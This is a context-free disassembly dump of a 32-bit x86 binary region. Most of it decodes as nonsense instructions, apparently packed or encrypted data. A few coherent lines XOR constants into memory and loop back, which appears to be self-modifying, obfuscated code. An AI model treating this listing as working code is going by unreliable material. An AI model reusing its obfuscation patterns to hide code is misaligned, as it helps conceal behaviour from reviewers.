  40b7a6:	inc    ebp
  40b7a7:	cld    
  40b7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a9:	or     esi,ecx
  40b7ab:	scas   al,BYTE PTR es:[edi]
  40b7ac:	mov    eax,0x66011f97
  40b7b1:	and    al,0xec
  40b7b3:	dec    eax
  40b7b4:	inc    ebp
  40b7b5:	ds mov ah,0x88
  40b7b8:	push   esi
  40b7b9:	or     esi,DWORD PTR [edx]
  40b7bb:	push   ecx
  40b7bc:	sbb    edi,eax
  40b7be:	or     edx,esi
  40b7c0:	paddsw mm4,QWORD PTR [ecx]
  40b7c3:	les    ebp,FWORD PTR [edx+ebp*8-0x2b]
  40b7c7:	inc    esi
  40b7c8:	and    ebp,DWORD PTR [ebx+0x4ccee6b]
  40b7ce:	in     eax,0x3a
  40b7d0:	cdq    
  40b7d1:	mov    ebp,0xd13bfe5e
  40b7d6:	sub    WORD PTR es:[esi-0xf0d75b5],dx
  40b7de:	add    eax,0xf3c64ad1
  40b7e3:	and    dh,BYTE PTR [edx-0x638bcda1]
  40b7e9:	add    al,0xeb
  40b7eb:	(bad)  
  40b7ec:	loop   0x40b824
  40b7ee:	dec    ebp
  40b7ef:	sbb    al,0x3b
  40b7f1:	fiadd  DWORD PTR cs:[si-0x45ed]
  40b7f7:	lods   eax,DWORD PTR ds:[esi]
  40b7f8:	sbb    BYTE PTR [eax],al
  40b7fa:	jno    0x40b86a
  40b7fc:	iret   
  40b7fd:	jmp    0xb152:0x9ebd575f
  40b804:	mov    ecx,0xa8fc26b0
  40b809:	loope  0x40b82f
  40b80b:	cli    
  40b80c:	inc    esi
  40b80d:	hlt    
  40b80e:	loop   0x40b7b5
  40b810:	jo     0x40b7e7
  40b812:	and    edi,DWORD PTR [ebx+0x3c]
  40b815:	shl    BYTE PTR [ecx+0x461f6827],cl
  40b81b:	adc    eax,0x55c787b2
  40b820:	es aaa 
  40b822:	in     eax,0x90
  40b824:	bound  ebp,QWORD PTR [ebx]
  40b826:	sub    bh,al
  40b828:	pop    eax
  40b829:	xor    al,0xd8
  40b82b:	push   ecx
  40b82c:	or     esp,DWORD PTR [ecx+eiz*1-0x55]
  40b830:	es in  eax,0xe2
  40b833:	addr16 xchg esi,eax
  40b835:	inc    edi
  40b836:	push   ds
  40b837:	packsswb mm4,QWORD PTR [esi+edi*1]
  40b83b:	aad    0x96
  40b83d:	xor    dh,BYTE PTR [edi+ebx*1+0x19]
  40b841:	loope  0x40b8a0
  40b843:	jmp    0x40b848
  40b845:	(bad)  
  40b846:	std    
  40b847:	adc    al,0x33
  40b849:	mov    dl,0xc6
  40b84b:	sub    edx,ecx
  40b84d:	dec    esp
  40b84e:	or     BYTE PTR [esi+0x5d],ch
  40b851:	iret   
  40b852:	pusha  
  40b853:	jb     0x40b884
  40b855:	leave  
  40b856:	icebp  
  40b857:	push   esp
  40b858:	cs ss call 0xe075:0x513ee11e
  40b861:	das    
  40b862:	xchg   esi,eax
  40b863:	loopne 0x40b827
  40b865:	neg    BYTE PTR [ecx+0x1f9071d]
  40b86b:	adc    eax,0x843f491e
  40b870:	loop   0x40b7fc
  40b872:	and    al,0x95
  40b874:	push   0x5ee00bbe
  40b879:	pusha  
  40b87a:	test   DWORD PTR [ebx+0xedd705e],esi
  40b880:	inc    ecx
  40b881:	add    eax,0xce14f19
  40b886:	adc    al,0x7f
  40b888:	out    0x80,al
  40b88a:	push   eax
  40b88b:	sub    eax,0x57655647
  40b890:	pop    edi
  40b891:	stos   BYTE PTR es:[edi],al
  40b892:	cdq    
  40b893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b894:	ret    
  40b895:	dec    ebx
  40b896:	in     al,dx
  40b897:	sub    BYTE PTR [ecx-0x7e5f77bb],al
  40b89d:	in     al,dx
  40b89e:	xor    BYTE PTR [edi+0x7f612d66],dl
  40b8a4:	add    ebp,esp
  40b8a6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40b8a8:	mov    eax,0xf771ab4b
  40b8ad:	cdq    
  40b8ae:	pop    ds
  40b8af:	dec    esp
  40b8b0:	cmp    al,0x81
  40b8b2:	stc    
  40b8b3:	push   eax
  40b8b4:	std    
  40b8b5:	push   ecx
  40b8b6:	popa   
  40b8b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8b8:	imul   DWORD PTR [ebx-0x39]
  40b8bb:	or     bl,BYTE PTR [ebx-0x14]
  40b8be:	aam    0xd9
  40b8c0:	mov    eax,DWORD PTR [edi-0x26]
  40b8c3:	arpl   dx,cx
  40b8c5:	into   
  40b8c6:	les    ecx,FWORD PTR [eax]
  40b8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8c9:	xor    dh,BYTE PTR [eax-0x361ce750]
  40b8cf:	push   cs
  40b8d0:	sar    ebx,1
  40b8d2:	jno    0x40b85e
  40b8d4:	cs sbb eax,DWORD PTR ds:[edx-0x4d757531]
  40b8dc:	aam    0x80
  40b8de:	clc    
  40b8df:	aad    0x22
  40b8e1:	clc    
  40b8e2:	jl     0x40b8d5
  40b8e4:	xor    BYTE PTR [edx+eiz*1-0x37728497],0x87
  40b8ec:	leave  
  40b8ed:	xor    cl,BYTE PTR [edx-0x7effc31f]
  40b8f3:	xor    edi,DWORD PTR [edx+0x4a02db7]
  40b8f9:	fisttp DWORD PTR [edx+esi*4+0x4b]
  40b8fd:	std    
  40b8fe:	jb     0x40b931
  40b900:	retf   
  40b901:	int    0xca
  40b903:	rcr    DWORD PTR [esi+0x1047f04e],cl
  40b909:	repnz in al,0xed
  40b90c:	dec    DWORD PTR [ecx-0x5e]
  40b90f:	fmul   QWORD PTR [edx]
  40b911:	div    BYTE PTR [eax+eax*2]
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	sar    edx,cl
  40b93f:	add    DWORD PTR [edi+0x0],ecx
  40b942:	(bad)  
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	pop    ds
  40b94b:	pop    ebp
  40b94c:	or     al,0x30
  40b94e:	sub    ah,BYTE PTR [esi+eiz*8+0x0]
  40b952:	je     0x40b9be
  40b954:	xchg   edx,eax
  40b955:	xor    eax,esi
  40b957:	or     eax,0x246e18c7
  40b95c:	push   esp
  40b95d:	mov    edi,0xf772ea33
  40b962:	push   0x6b
  40b964:	push   ss
  40b965:	pop    ebx
  40b966:	sub    BYTE PTR gs:[esi],dh
  40b969:	bound  ecx,QWORD PTR [esi]
  40b96b:	mov    cl,0x82
  40b96d:	ds ds popa 
  40b970:	xchg   esp,eax
  40b971:	cmp    edx,DWORD PTR [ebx]
  40b973:	arpl   di,ax
  40b975:	scas   eax,DWORD PTR es:[edi]
  40b976:	retf   
  40b977:	sbb    al,ah
  40b979:	push   esp
  40b97a:	cwde   
  40b97b:	das    
  40b97c:	ss test eax,0x90c060e6
  40b982:	shl    DWORD PTR [ebx],cl
  40b984:	cmp    DWORD PTR [ecx+0xa],edi
  40b987:	pop    eax
  40b988:	jle    0x40b9a2
  40b98a:	lds    ecx,FWORD PTR ds:0xf33645eb
  40b990:	sub    DWORD PTR [ecx],0x63f27602
  40b996:	xor    esp,DWORD PTR [edx+0x7]
  40b999:	and    esp,DWORD PTR [edi+0x15e69a41]
  40b99f:	mov    DWORD PTR [ecx+0x1c],eax
  40b9a2:	lds    ebp,FWORD PTR [ecx-0x7d90da31]
  40b9a8:	jo     0x40b9f2
  40b9aa:	ins    BYTE PTR es:[edi],dx
  40b9ab:	fs mov edi,0xeaae8414
  40b9b1:	jmp    0xd46bceda
  40b9b6:	rcr    DWORD PTR [edi*2+0x7f111983],0x32
  40b9be:	jle    0x40b9b9
  40b9c0:	ins    DWORD PTR es:[edi],dx
  40b9c1:	mov    edx,ss
  40b9c3:	dec    esp
  40b9c4:	fwait
  40b9c5:	cmp    ebp,DWORD PTR [ecx-0x41]
  40b9c8:	lds    edi,FWORD PTR [ebp-0x6a]
  40b9cb:	adc    edi,edi
  40b9cd:	pop    es
  40b9ce:	outs   dx,DWORD PTR ds:[esi]
  40b9cf:	fcmovb st,st(7)
  40b9d1:	xor    DWORD PTR [ebp-0x28],esi
  40b9d4:	arpl   WORD PTR [ebx+0x4],cx
  40b9d7:	jb     0x40ba55
  40b9d9:	inc    esp
  40b9da:	in     eax,0xb1
  40b9dc:	xchg   ebp,eax
  40b9dd:	push   0xfd7a58f6
  40b9e2:	gs pop esi
  40b9e4:	jbe    0x40b9cd
  40b9e6:	push   ebp
  40b9e7:	add    al,0x74
  40b9e9:	ret    
  40b9ea:	fcomp  DWORD PTR [esi+0x24]
  40b9ed:	(bad)  
  40b9ee:	(bad)  
  40b9ef:	or     BYTE PTR [eax],dh
  40b9f1:	ror    DWORD PTR [esi+0x742659f5],0x74
  40b9f8:	(bad)  
  40b9f9:	fisubr DWORD PTR [edx+0x78]
  40b9fc:	pop    ebp
  40b9fd:	xchg   BYTE PTR [eax-0x33cb3a30],ah
  40ba03:	mov    dh,0x71
  40ba05:	retf   0x659
  40ba08:	jno    0x40b9eb
  40ba0a:	cs rcl ch,cl
  40ba0d:	aas    
  40ba0e:	add    eax,0xdd36ee9a
  40ba13:	adc    esp,eax
  40ba15:	cdq    
  40ba16:	and    BYTE PTR [ebp+0x51eaa421],cl
  40ba1c:	ins    DWORD PTR es:[edi],dx
  40ba1d:	in     al,dx
  40ba1e:	mov    ch,0x1e
  40ba20:	dec    ebp
  40ba21:	inc    ecx
  40ba22:	or     al,0x4c
  40ba24:	adc    eax,esp
  40ba26:	jne    0x40ba8f
  40ba28:	xchg   ecx,eax
  40ba29:	pop    ss
  40ba2a:	call   0x71c5:0x2b20c6c
  40ba31:	imul   esp
  40ba33:	rol    ebp,1
  40ba35:	jo     0x40ba5d
  40ba37:	mov    al,ds:0x7b601c6e
  40ba3c:	sbb    cl,BYTE PTR [eax+0x4e26ecec]
  40ba42:	shl    DWORD PTR [edi+0x15],1
  40ba45:	cld    
  40ba46:	aaa    
  40ba47:	xchg   esi,eax
  40ba48:	sub    edi,esi
  40ba4a:	icebp  
  40ba4b:	js     0x40b9fd
  40ba4d:	test   bl,0x12
  40ba50:	or     eax,0xc3a6bfd
  40ba55:	pop    eax
  40ba56:	scas   eax,DWORD PTR es:[edi]
  40ba57:	lahf   
  40ba58:	adc    al,0x95
  40ba5a:	jns    0x40ba2d
  40ba5c:	scas   eax,DWORD PTR es:[edi]
  40ba5d:	icebp  
  40ba5e:	or     BYTE PTR [eax],al
  40ba60:	ret    
  40ba61:	add    DWORD PTR [edi-0x4a],0x485fc8ea
  40ba68:	popa   
  40ba69:	jecxz  0x40ba7d
  40ba6b:	hlt    
  40ba6c:	fwait
  40ba6d:	adc    DWORD PTR [ebp-0x5f],edx
  40ba70:	sub    DWORD PTR [esi+0x68],ebx
  40ba73:	test   ebp,ecx
  40ba75:	int3   
  40ba76:	pop    ebp
  40ba77:	xor    BYTE PTR [esi+0x669ea95],ch
  40ba7d:	xor    ah,dh
  40ba7f:	pop    edx
  40ba80:	lods   eax,DWORD PTR ds:[esi]
  40ba81:	ficom  DWORD PTR [ebp+0x19beed76]
  40ba87:	(bad)  [ebx]
  40ba89:	test   al,0xf5
  40ba8b:	(bad)  
  40ba8c:	mov    edi,0xbd5d3bb7
  40ba91:	jne    0x40ba71
  40ba93:	rcl    dh,0x90
  40ba96:	inc    ecx
  40ba97:	pushf  
  40ba98:	stos   DWORD PTR es:[edi],eax
  40ba99:	punpcklbw mm2,mm7
  40ba9c:	or     ch,BYTE PTR [ebx-0x61040d79]
  40baa2:	test   BYTE PTR [eax-0x39c5c3a7],ah
  40baa8:	push   edx
  40baa9:	fild   WORD PTR [ebp-0x34]
  40baac:	mov    edi,0xa9ef58f0
  40bab1:	mov    ecx,es
  40bab3:	fidiv  WORD PTR [esi+edi*2-0x3bbea84a]
  40baba:	sub    ch,cl
  40babc:	pop    edi
  40babd:	push   ebp
  40babe:	iret   
  40babf:	push   ds
  40bac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bac1:	jecxz  0x40ba4f
  40bac3:	jg     0x40ba94
  40bac5:	popf   
  40bac6:	mov    BYTE PTR [ebp-0x13d0f6d6],ah
  40bacc:	add    DWORD PTR [edi],eax
  40bace:	adc    BYTE PTR [esi-0x3d],dh
  40bad1:	rol    BYTE PTR [ecx+0x49],0x86
  40bad5:	dec    eax
  40bad6:	in     eax,0x4c
  40bad8:	push   ebx
  40bad9:	mov    ds:0xc06991dc,al
  40bade:	hlt    
  40badf:	add    edx,DWORD PTR [ebx+0xe81e86a]
  40bae5:	out    0xf9,eax
  40bae7:	scas   eax,DWORD PTR es:[edi]
  40bae8:	imul   esp,esp,0xffffffc3
  40baeb:	fs into 
  40baed:	repnz sub DWORD PTR [esi*8-0x26be9043],esp
  40baf5:	je     0x40bb40
  40baf7:	and    al,BYTE PTR [edx+0x46ed080]
  40bafd:	inc    edi
  40bafe:	fild   WORD PTR [ecx]
  40bb00:	push   esp
  40bb01:	(bad)  
  40bb02:	ja     0x40bb6f
  40bb04:	sub    al,0x69
  40bb06:	rcl    BYTE PTR [ebp+eiz*1+0x25af23fb],0xe1
  40bb0e:	sub    esp,ecx
  40bb10:	fdivr  st(0),st
  40bb12:	mov    ebx,0xd49bed06
  40bb17:	jbe    0x40bb98
  40bb19:	movzx  edi,si
  40bb1c:	(bad)  
  40bb1d:	rcr    DWORD PTR [ecx-0x64bc7dfb],1
  40bb23:	leave  
  40bb24:	push   edi
  40bb25:	jmp    0x8656:0x10d2381e
  40bb2c:	adc    DWORD PTR [ebx+ebx*8],esp
  40bb2f:	(bad)  
  40bb30:	retf   0xfb74
  40bb33:	ins    BYTE PTR es:[edi],dx
  40bb34:	sub    al,0x82
  40bb36:	not    ecx
  40bb38:	enter  0xd0c1,0x6
  40bb3c:	std    
  40bb3d:	xchg   DWORD PTR [eax+0x312797f2],ebx
  40bb43:	pop    ds
  40bb44:	cmc    
  40bb45:	adc    edx,ebp
  40bb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb48:	imul   ebp,edi,0x8468770
  40bb4e:	dec    ecx
  40bb4f:	outs   dx,DWORD PTR ds:[esi]
  40bb50:	dec    ebx
  40bb51:	ficomp DWORD PTR [ebp-0x322351c0]
  40bb57:	fist   WORD PTR [ecx+0x43]
  40bb5a:	sub    eax,0xdbb9014c
  40bb5f:	mov    edx,0x76db7d55
  40bb64:	es inc eax
  40bb66:	cmp    eax,DWORD PTR [esi-0x7cb5f878]
  40bb6c:	push   edi
  40bb6d:	xchg   BYTE PTR [esi+ebp*8+0xc5e554d],bh
  40bb74:	add    al,bl
  40bb76:	sub    DWORD PTR [esi],edx
  40bb78:	jae    0x40bb86
  40bb7a:	mov    edx,0xc5c32a9d
  40bb7f:	addr16 mov bl,0x7f
  40bb82:	aam    0x9
  40bb84:	sbb    al,0x82
  40bb86:	or     eax,0x1b328a7c
  40bb8b:	inc    ecx
  40bb8c:	jle    0x40bb46
  40bb8e:	sbb    dh,dh
  40bb90:	jl     0x40bc08
  40bb92:	jl     0x40bb40
  40bb94:	out    dx,eax
  40bb95:	in     al,dx
  40bb96:	int3   
  40bb97:	mov    ds:0xaa729034,al
  40bb9c:	push   ebx
  40bb9d:	repz xchg edx,eax
  40bb9f:	ds das 
  40bba1:	mov    al,0x6b
  40bba3:	add    ecx,DWORD PTR [ebx]
  40bba5:	ins    BYTE PTR es:[edi],dx
  40bba6:	bound  edx,QWORD PTR [eax-0x4c]
  40bba9:	stos   BYTE PTR es:[edi],al
  40bbaa:	(bad)
  40bbad:	pop    esp
  40bbae:	and    eax,0x8bc73575
  40bbb3:	jmp    0x369a:0x411adcb5
  40bbba:	jmp    0x40bc2b
  40bbbc:	int3   
  40bbbd:	fisubr WORD PTR [edx]
  40bbbf:	and    eax,0x77e4d71d
  40bbc4:	cld    
  40bbc5:	sub    ebx,DWORD PTR [ebx]
  40bbc7:	fwait
  40bbc8:	imul   ebp,ebp,0xffffff99
  40bbcb:	popa   
  40bbcc:	jnp    0x40bb80
  40bbce:	xchg   ebp,eax
  40bbcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd0:	mov    fs,WORD PTR [ecx+edi*8-0x4]
  40bbd4:	push   ebp
  40bbd5:	mov    edi,DWORD PTR [edx]
  40bbd7:	ret    
  40bbd8:	fcmovb st,st(0)
  40bbda:	and    esp,DWORD PTR [edx+0x155f7f82]
  40bbe0:	iret   
  40bbe1:	inc    edi
  40bbe2:	mov    bl,0xd
  40bbe4:	popf   
  40bbe5:	or     dh,BYTE PTR [edi]
  40bbe7:	push   eax
  40bbe8:	dec    eax
  40bbe9:	imul   edx,DWORD PTR [ebx+0x68c7f67e],0x6f
  40bbf0:	mov    bh,0xbd
  40bbf2:	xchg   DWORD PTR [ecx+0xb],ebp
  40bbf5:	add    DWORD PTR [ebx],edi
  40bbf7:	sar    ebx,1
  40bbf9:	fild   DWORD PTR [ebx]
  40bbfb:	shl    DWORD PTR [esi],cl
  40bbfd:	xor    dl,dl
  40bbff:	sub    BYTE PTR [eax],al
  40bc01:	call   0xb385:0xea4057b5
  40bc08:	mov    al,ds:0xec3a56e8
  40bc0d:	cmc    
  40bc0e:	adc    BYTE PTR [ebp+0x7],dh
  40bc11:	gs cmc 
  40bc13:	jbe    0x40bc0f
  40bc15:	call   0xd55c:0x556e1ac7
  40bc1c:	test   al,0xb6
  40bc1e:	adc    eax,DWORD PTR [ebx-0x3e]
  40bc21:	iret   
  40bc22:	xor    esp,DWORD PTR [esi]
  40bc24:	push   ecx
  40bc25:	cli    
  40bc26:	xchg   bh,ch
  40bc28:	sbb    DWORD PTR ds:0xb22afe13,0x5b
  40bc2f:	pop    ebp
  40bc30:	dec    ebp
  40bc31:	push   ebx
  40bc32:	dec    edx
  40bc33:	ins    BYTE PTR es:[edi],dx
  40bc34:	cmp    esi,DWORD PTR [eax-0x7]
  40bc37:	cwde   
  40bc38:	into   
  40bc39:	mov    dh,0x95
  40bc3b:	in     eax,0xfd
  40bc3d:	mov    ah,ah
  40bc3f:	inc    edi
  40bc40:	dec    BYTE PTR [ebp-0x2cda6483]
  40bc46:	mov    eax,DWORD PTR [ebp-0xc]
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bcf2
  40bc7d:	loopne 0x40bc32
  40bc7f:	dec    ebx
  40bc80:	ret    0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bca0
  40bc89:	clc    
  40bc8a:	mov    ah,0x2
  40bc8c:	mov    ds:0x5d1fda,eax
  40bc91:	cmp    DWORD PTR [eax+0x38ce6a6b],ecx
  40bc97:	jmp    0x40bc74
  40bc99:	cmp    ebx,esi
  40bc9b:	sahf   
  40bc9c:	mov    ah,0x27
  40bc9e:	and    bl,BYTE PTR ds:0x45ffe350
  40bca4:	test   DWORD PTR [edx+0x87af2dd],0x3fd54392
  40bcae:	lods   eax,DWORD PTR ds:[esi]
  40bcaf:	cli    
  40bcb0:	xchg   edi,edx
  40bcb2:	loop   0x40bc8e
  40bcb4:	sbb    esi,edx
  40bcb6:	mov    eax,0x4455a1ab
  40bcbb:	jns    0x40bce9
  40bcbd:	push   ecx
  40bcbe:	add    bl,BYTE PTR [ebp-0x711f95ae]
  40bcc4:	rcr    DWORD PTR [esi+0x51a22a23],0x10
  40bccb:	in     al,0xa4
  40bccd:	sub    dh,BYTE PTR [edi-0x47415226]
  40bcd3:	add    DWORD PTR [edx+0x458c96b1],esi
  40bcd9:	repz lock arpl WORD PTR [edx+0x65ff371f],bx
  40bce1:	lea    ebp,[ecx+0x2470e16c]
  40bce7:	lahf   
  40bce8:	(bad)  
  40bce9:	sbb    eax,0x24a4da1c
  40bcee:	mov    dl,0xfd
  40bcf0:	lods   eax,DWORD PTR ds:[esi]
  40bcf1:	jne    0x40bcf1
  40bcf3:	xor    eax,ecx
  40bcf5:	mov    edx,0xc8923e26
  40bcfa:	nop
  40bcfb:	(bad)  
  40bcfc:	sti    
  40bcfd:	sbb    DWORD PTR [edx+esi*1-0x25121256],edx
  40bd04:	cld    
  40bd05:	jb     0x40bcb7
  40bd07:	pop    esi
  40bd08:	or     eax,0x32e5eb89
  40bd0d:	into   
  40bd0e:	cwde   
  40bd0f:	ficom  DWORD PTR [edx+0x39]
  40bd12:	mov    dh,0xe1
  40bd14:	cmp    DWORD PTR [edi+ebx*8-0x35ff445],0xf5e0ef16
  40bd1f:	popa   
  40bd20:	and    DWORD PTR [edi-0x59],esp
  40bd23:	inc    ebp
  40bd24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd25:	and    DWORD PTR [edx+0x42d1ee77],ebx
  40bd2b:	sub    esp,DWORD PTR [esi]
  40bd2d:	fldenv [ebp-0x19]
  40bd30:	and    DWORD PTR [edx],0x51
  40bd33:	or     esi,DWORD PTR ds:0xf2958175
  40bd39:	pop    ds
  40bd3a:	mov    edx,0xbbb519ac
  40bd3f:	jg     0x40bcfa
  40bd41:	xchg   ebp,eax
  40bd42:	retf   0x48e2
  40bd45:	test   al,0x8
  40bd47:	pop    ebp
  40bd48:	(bad)  
  40bd49:	jmp    0x48c80dcd
  40bd4e:	bound  esp,QWORD PTR [esi-0x3e]
  40bd51:	adc    bh,BYTE PTR [eax]
  40bd53:	adc    ebx,esp
  40bd55:	inc    edx
  40bd56:	loope  0x40bd64
  40bd58:	inc    ecx
  40bd59:	scas   eax,DWORD PTR es:[edi]
  40bd5a:	sub    eax,0xe131dc51
  40bd5f:	push   ebp
  40bd60:	out    dx,eax
  40bd61:	dec    eax
  40bd62:	imul   ecx,DWORD PTR [ebp-0x6a369bd4],0x73a71964
  40bd6c:	in     al,0xb7
  40bd6e:	xchg   esp,eax
  40bd6f:	cld    
  40bd70:	int    0x3b
  40bd72:	int3   
  40bd73:	dec    ecx
  40bd74:	(bad)  
  40bd75:	imul   edx,DWORD PTR [ecx-0x7f],0x45
  40bd79:	mov    cl,0xf8
  40bd7b:	or     BYTE PTR [edx],0xe4
  40bd7e:	test   eax,0x15b86b73
  40bd83:	sub    eax,0xa2c8ffa8
  40bd88:	fwait
  40bd89:	popa   
  40bd8a:	imul   edi,ebx,0xa8c83acb
  40bd90:	bound  esp,QWORD PTR [edx-0x55]
  40bd93:	or     DWORD PTR [esi-0x73],0x2
  40bd97:	xchg   edi,eax
  40bd98:	jne    0x40bd4e
  40bd9a:	ror    DWORD PTR [ebx],cl
  40bd9c:	dec    ebx
  40bd9d:	or     BYTE PTR [ebx],dl
  40bd9f:	fstp   TBYTE PTR [edx-0x4c]
  40bda2:	retf   
  40bda3:	(bad)  
  40bda4:	cli    
  40bda5:	sub    BYTE PTR [edi+0x17cdb89d],dh
  40bdab:	mov    edx,0xf0648dca
  40bdb0:	cmc    
  40bdb1:	iret   
  40bdb2:	cmp    DWORD PTR [edx],esp
  40bdb4:	je     0x40bdd7
  40bdb6:	or     ah,BYTE PTR [ecx]
  40bdb8:	mov    ecx,0xbe4ca3b
  40bdbd:	loop   0x40bd7b
  40bdbf:	xor    DWORD PTR [edx],ecx
  40bdc1:	mov    bh,0xab
  40bdc3:	popa   
  40bdc4:	add    BYTE PTR [edx+0x538bdea5],cl
  40bdca:	out    dx,al
  40bdcb:	jbe    0x40be18
  40bdcd:	mov    ebp,0x4cbe7471
  40bdd2:	div    BYTE PTR [edx]
  40bdd4:	add    eax,0xf7847663
  40bdd9:	or     BYTE PTR [eax+0x1ae4f875],bh
  40bddf:	pop    esp
  40bde0:	xor    DWORD PTR [ebx],ecx
  40bde2:	das    
  40bde3:	mov    al,0xaf
  40bde5:	fidivr WORD PTR [ecx-0x60d851b]
  40bdeb:	inc    esi
  40bdec:	or     BYTE PTR [ecx],0xa7
  40bdef:	inc    esp
  40bdf0:	xchg   esi,eax
  40bdf1:	rol    BYTE PTR [ecx],1
  40bdf3:	push   ebx
  40bdf4:	ja     0x40be3d
  40bdf6:	mov    al,0xd7
  40bdf8:	jge    0x40be4e
  40bdfa:	and    DWORD PTR [esi],edx
  40bdfc:	jg     0x40bda6
  40bdfe:	lock xlat BYTE PTR ds:[ebx]
  40be00:	dec    edi
  40be01:	adc    ch,cl
  40be03:	mov    ch,0x7
  40be05:	mov    dh,0x1d
  40be07:	push   edi
  40be08:	xor    eax,DWORD PTR [ebx]
  40be0a:	ret    
  40be0b:	push   es
  40be0c:	lods   eax,DWORD PTR ds:[esi]
  40be0d:	and    ebx,DWORD PTR [ecx+0x3c879b91]
  40be13:	xchg   ecx,eax
  40be14:	cmp    eax,0x4dc0bebd
  40be19:	pop    ecx
  40be1a:	arpl   WORD PTR [ebx-0x4dc13f1f],sp
  40be20:	rol    DWORD PTR [esi+0x47c04ff4],1
  40be26:	stos   DWORD PTR es:[edi],eax
  40be27:	sbb    ebx,0xd11d1dba
  40be2d:	lods   eax,DWORD PTR ds:[esi]
  40be2e:	cmp    cl,BYTE PTR [ecx+esi*8-0x5]
  40be32:	pop    edi
  40be33:	lods   eax,DWORD PTR ds:[esi]
  40be34:	inc    ecx
  40be35:	jge    0x40be5b
  40be37:	jecxz  0x40be70
  40be39:	sahf   
  40be3a:	sbb    DWORD PTR [ecx-0x675bcc6e],edx
  40be40:	nop
  40be41:	or     al,0xb2
  40be43:	or     DWORD PTR [edx-0x4a],0x4cb39346
  40be4a:	cmp    DWORD PTR [eax-0x3e],esi
  40be4d:	cwde   
  40be4e:	mov    BYTE PTR [edx-0x76],bh
  40be51:	es retf 
  40be53:	xor    al,0x7d
  40be55:	enter  0xebb5,0x76
  40be59:	(bad)  
  40be5b:	push   ebp
  40be5c:	inc    esp
  40be5d:	jno    0x40be01
  40be5f:	cmp    BYTE PTR [esp+edx*1-0x48],bh
  40be63:	loop   0x40bdf8
  40be65:	inc    eax
  40be66:	out    dx,eax
  40be67:	pop    ds
  40be68:	cdq    
  40be69:	(bad)  
  40be6a:	out    dx,eax
  40be6b:	xor    DWORD PTR [ecx+edi*4],esp
  40be6e:	lods   eax,DWORD PTR ds:[esi]
  40be6f:	pop    edx
  40be70:	push   ss
  40be71:	faddp  st(2),st
  40be73:	adc    al,BYTE PTR [edi+0x619f15c1]
  40be79:	xor    dl,BYTE PTR [ebp-0x512603ee]
  40be7f:	xlat   BYTE PTR ds:[ebx]
  40be80:	sti    
  40be81:	lods   eax,DWORD PTR ds:[esi]
  40be82:	popf   
  40be83:	mov    ah,BYTE PTR [ebx+0x2490dfc1]
  40be89:	adc    al,0x44
  40be8b:	xchg   ebp,eax
  40be8c:	sbb    ecx,ebp
  40be8e:	repz loop 0x40bebb
  40be91:	sbb    ebx,DWORD PTR [esp+ebp*1-0x5eab9aec]
  40be98:	inc    edi
  40be99:	push   cs
  40be9a:	add    ch,BYTE PTR [ebx]
  40be9c:	mov    ebp,0x7cfd63ae
  40bea1:	xor    DWORD PTR ds:0xe26d567e,esp
  40bea7:	pop    ebp
  40bea8:	test   BYTE PTR ds:[edi],al
  40beab:	ror    BYTE PTR [eax-0x4837cf68],cl
  40beb1:	(bad)  
  40beb2:	repz sub BYTE PTR [ecx-0x8eb43fd],dh
  40beb9:	fsub   QWORD PTR [edi+0x2b]
  40bebc:	add    eax,0x13c0ee95
  40bec1:	test   al,0x11
  40bec3:	int    0xa
  40bec5:	mov    eax,ds:0x1c2ed573
  40beca:	mov    dh,0x6b
  40becc:	xchg   DWORD PTR [edi-0x6],edx
  40becf:	and    DWORD PTR [esi-0x5529397b],esp
  40bed5:	fcomi  st,st(7)
  40bed7:	jecxz  0x40be88
  40bed9:	repnz jecxz 0x40beaa
  40bedc:	sti    
  40bedd:	cmp    BYTE PTR [ecx],0xb3
  40bee0:	test   DWORD PTR [ebp-0x2506fe4],ecx
  40bee6:	cmp    BYTE PTR [esi],al
  40bee8:	retf   
  40bee9:	or     al,0xbc
  40beeb:	or     al,0x69
  40beed:	lods   eax,DWORD PTR ds:[esi]
  40beee:	inc    DWORD PTR [edi-0xa]
  40bef1:	imul   edx,eax,0x77e9d909
  40bef7:	jb     0x40bf6d
  40bef9:	inc    esp
  40befa:	mov    bh,0x5a
  40befc:	lahf   
  40befd:	repnz or BYTE PTR [ebx-0x5c],dh
  40bf01:	arpl   WORD PTR [ecx-0x3713b464],sp
  40bf07:	mov    esi,0x4b3c3de1
  40bf0c:	xor    eax,0xa0513e66
  40bf11:	xchg   ebp,eax
  40bf12:	scas   eax,DWORD PTR es:[edi]
  40bf13:	addr16 push ecx
  40bf15:	sti    
  40bf16:	dec    esp
  40bf17:	cmp    DWORD PTR [eax+0x23c536d7],ecx
  40bf1d:	dec    ecx
